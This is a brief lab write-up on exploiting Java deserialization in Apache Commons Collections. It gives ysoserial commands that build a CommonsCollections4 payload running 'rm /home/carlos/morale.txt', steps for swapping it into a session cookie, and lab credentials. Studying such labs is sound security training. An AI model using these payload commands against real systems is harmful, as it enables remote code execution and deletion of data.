# Lab 05 — Java Deserialization with Apache Commons Collections

## Objective

Exploit Java deserialization using a pre-built gadget chain to delete:

```text
/home/carlos/morale.txt
```

Credentials:

```text
wiener:peter
```

The lab uses Apache Commons Collections and does not provide source code.

## Tool

The Academy uses `ysoserial`.

For Java 16+:

```bash
java \
 --add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.trax=ALL-UNNAMED \
 --add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.runtime=ALL-UNNAMED \
 --add-opens=java.base/java.net=ALL-UNNAMED \
 --add-opens=java.base/java.util=ALL-UNNAMED \
 -jar ysoserial-all.jar CommonsCollections4 'rm /home/carlos/morale.txt' | base64
```

For Java 15 and below:

```bash
java -jar ysoserial-all.jar CommonsCollections4 'rm /home/carlos/morale.txt' | base64
```

## Steps

1. Log in.
2. Observe that the session cookie contains a serialized Java object.
3. Send a request containing the cookie to Burp Repeater.
4. Generate the malicious serialized object with the appropriate gadget chain.
5. Replace the session cookie with the generated value.
6. URL-encode the cookie.
7. Send the request.

## Learning point

Pre-built gadget chains can make black-box exploitation possible when a vulnerable library is known or strongly suspected.
